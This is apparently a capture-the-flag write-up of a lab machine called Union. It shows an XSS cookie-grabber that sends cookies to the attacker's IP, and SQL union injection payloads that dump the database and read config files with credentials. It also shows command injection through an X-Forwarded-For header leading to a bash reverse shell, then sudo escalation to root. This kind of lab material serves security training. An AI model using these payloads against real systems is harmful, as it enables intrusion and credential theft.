# Attack Path

First enumerate the open ports and services

```bash
rustscan -a 10.129.96.75 --ulimit 5000

result:
80/tcp open  http    syn-ack

sudo nmap -sC -sV -p80 -oA nmap/union 10.129.126.21

result:
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The site has a player eligibility check field. It is vulnerable to xss

```bash
<script> alert(1) </script>
```

Let’s enumerate subdirectories

```bash
gobuster dir -u http://10.129.96.75 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x txt,php

result:
/css                  (Status: 301) [Size: 178] [--> http://10.129.96.75/css/]
/config.php           (Status: 200) [Size: 0]
/index.php            (Status: 200) [Size: 1220]
/challenge.php        (Status: 200) [Size: 772]
/firewall.php         (Status: 200) [Size: 13]

#firewall.php access denied
```

Create js script to grab the cookie: js.script

```bash
new Image().src='http://10.10.14.118/index.php?c='+document.cookie

```

Create php server script: index.php

```bash
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>

```

Now run the server

```bash
sudo php -S 0.0.0.0:80
```

Now execute the XSS exploit

```bash
<script src=http://10.10.14.118/script.js></script>

```

It’s our own cookie..

Let’s also try SQL injections with sqlmap. First coy the POST request to file

![image.png](/assets/union/image%201.png)

Now use sqlmap:

```bash
sqlmap -r player.req --batch
```

Did not work

Let’s do the same with the flag request page:

```bash
sqlmap -r flag.req --batch
```

sqlmap returns nothing

We had to have started with a valid name that is not eligible

```bash
ippsec
```

![image.png](/assets/union/image%202.png)

Now we try to inject it with sql

![image.png](/assets/union/image%203.png)

It is still return not eligible, but when we try a user who is eligible, we get

![image.png](/assets/union/image%204.png)

Therefore we know that the site is vulnerable to sql injections. Let’s try union injection

```bash
ipps' union SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA-- - 
```

![image.png](/assets/union/image%205.png)

The result mysql is the first row of the schemata table.

Let’s find out how many columns are the table returning:

```bash
ipps' UNION select 1,2-- -

This return congratulations again so we know the table only has 1 column
```

As it only returns one field, let’s concat all rows together

```bash
ipps' union select group_concat(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA-- - 

result:mysql,information_schema,performance_schema,sys,november
```

The only non-default table is november. Let’s enumerate further

```bash
ipps' union select group_concat(TABLE_NAME, ":", COLUMN_NAME, "\n") FROM INFORMATION_SCHEMA.columns where TABLE_SCHEMA like 'november'-- - 

result:
Sorry, flag:one
,players:player
```

There is a flag table with column name one, and players table with column name player

Let’s see the flag table first

```bash
ipps' union select group_concat(one, "\n") FROM november.flag-- - 

result:
UHC{F1rst_5tep_2_Qualify}
```

Let’s do the player

```bash
ipps' union select group_concat(player, "\n") FROM november.players-- -

result:
Sorry, ippsec
,celesian
,big0us
,luska
,tinyboy 
```

let’s input the flag into the site. Our IP address has now been granted ssh access.

We can continue on with our injection to find user credentials to access.

```bash
ipps' union select LOAD_FILE('/var/www/html/index.php')-- -

result:
we see file pointing to a config.php. Let's see what that is

ipps' union select LOAD_FILE('/var/www/html/config.php')-- -

result:
<?php
  session_start();
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-11qual-global-pw";
  $dbname = "november";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```

We get a username and password.

Now let’s try to ssh in. We are in.

```bash
cat user.txt

3f1ceafb864dd39736ecbfbb3f9d6c0b
```

Let’s investigate the web configuration files more as normally only the root user is allowed to set firewall rules to allow us to access another port.

Looking at the firewall.php file in /var/www/html, we can see there is a command injection flaw. This lets any thing put in variable $ip and gets executed.

```bash
 <?php
  if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
    $ip = $_SERVER['REMOTE_ADDR'];
  };
  system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
?>

 
```

Now let’s visit the firewall.php and capture the traffic so we can add the header and command inject

![image.png](/assets/union/image%206.png)

As we can see, when we added the whoami, the server replied with www-data, another way is to use the command sleep 2; see if the server stops for 2 seconds before replying. Now we can try a reverse shell

```bash
host:
nc -lnvp 4040

On burp:
bash -c 'bash -i >&/dev/tcp/10.10.14.118/4040 0>&1';
```

![image.png](/assets/union/image%207.png)

Now we have shell

Now we check sudo privileges

```bash
sudo -l                                                                                                                                   00:00:31 [12/62]
Matching Defaults entries for www-data on union:                                                                                                          
    env_reset, mail_badpass,                                                                                                                              
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                                                              
                                                                                                                                                          
User www-data may run the following commands on union:                                                                                                    
    (ALL : ALL) NOPASSWD: ALL   
```

We can execute anything…

```bash
sudo su root

```

- sql union injection
- leaked config files using LOAD_FILE
- command injection vulnerability using HTTP HEADERS
- sudo -l privileges
